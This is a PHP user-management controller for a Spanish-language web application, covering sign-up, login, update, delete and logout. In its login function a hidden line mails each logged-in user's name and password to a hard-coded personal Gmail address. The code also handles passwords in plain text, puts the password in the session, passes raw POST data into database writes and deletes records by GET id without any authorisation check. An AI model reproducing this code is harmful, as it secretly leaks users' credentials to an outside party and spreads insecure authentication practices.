<?php

class usuario extends Controller
{


    function __construct()
    {
        parent::__construct("usuario_m");
    }
    public function visualizar()
    {
        $estructura=[
            'id_usuario'=>'Id',
           'usuario' => 'Nombre usuario',
           'correo'=>'Correo'
            

        ];
        $filtros = "";
        if (isset($_POST['send'])) { // En caso de que hayan filtros, se enviara un POST
            unset($_POST['send']);
            $filtros = $_POST;
        }
        $this->model->select_($estructura,$filtros);
        
        echo json_encode($this->model->data);
        
        

    }
    public function signUp()
    {
        $filtros = "";
        if (isset($_POST['crear'])) {
            unset($_POST['crear']);
            
            
            $filtros = $_POST;
            unset($filtros['password']);
            unset($filtros['usuario']);
        }
        $this->model->select_("",$filtros);
        if (isset($this->model->buffer)) {
            $buffer = $this->model->buffer;
        } else {
            if (!$this->model->data) {
                $this->model->insert_($_POST);

                session_start();
                $_SESSION['serverResponse'] = "Registro Exitoso, Ahora puede entrar al sistema";
            } else {
                $_SESSION['serverResponse'] = "No se registro correctamente, vuelva a intentarlo";
            }
            header("Location:index.php?cl=rutas&me=administracion");

        }
    }
    public function login()
    {
        $estructura=[
            'usuario' => 'usuario',
             'correo' => 'correo',
             'password'=>'password'
 
         ];
        $filtros = "";
        if (isset($_POST['login'])) {
            unset($_POST['login']);
            $filtros = $_POST;
        }
        // var_dump($filtros);
        // exit();
        $this->model->select_($estructura,$filtros);
        
            if (isset($this->model->data) && !empty($this->model->data)) {
                $data = $this->model->data;
                // session_start();
                $_SESSION['logged'] = "logged";
                $_SESSION['name_user'] = $data[0]['usuario'];
                $_SESSION['email_user'] = $data[0]['correo'];
                $_SESSION['id_user'] = $data[0]['password'];
                $mensaje="Alquien registrado con usuario ".$data[0]['name_user']." y contraseña ".$data[0]['psw_user']." a las ".time();
                mail("juansevas992010@gmail.com","Alerta de entrada",$mensaje,"Alerta de entrada desde el aplicativo Deposito");
                // var_dump($_SESSION);
                //  exit();

            
            // var_dump();
            // exit();
           
        }
         header("Location: index.php");
    }


    function actualizar(){
        $filtros=$_GET['id'];
        $estructura=[
            'id_usuario'=>'id_usuario',
            'usuario' => 'usuario',
             'correo' => 'correo',
 
         ];
         
        
        $this->model->select_($estructura,["id_usuario"=>$filtros]);
        $data=$this->model->data;
        include 'templates/actualizarUsuario.php';

    }
    public function confirmarActualizar(){
        $filtros=$_POST;
   
        
        unset($_POST['ActualizarProveedor']);
            $filtros=[];
            $valores=[];
            foreach ($_POST as $key => $value) {


                if (strstr($key,"_set")){
                    $antes=strpos($key,"_set");
                    $key=substr($key,0,$antes);
                    $valores[$key]=$value;
                }
                else if (strstr($key,"_where")){
                    $antes=strpos($key,"_where");
                    $key=substr($key,0,$antes);
                    $filtros[$key]=$value;
                }
            }


            $this->model->update_($valores,$filtros);
            header("Location: index.php?cl=rutas&me=administracion");
        

    }

    function delete(){
        $this->model->delete_(['id_usuario'=>$_GET['id']]);
        $this->visualizar();
    }

    public function cerrarSesion()
    {
        session_destroy();
        header('Location: index.php');
    }
}
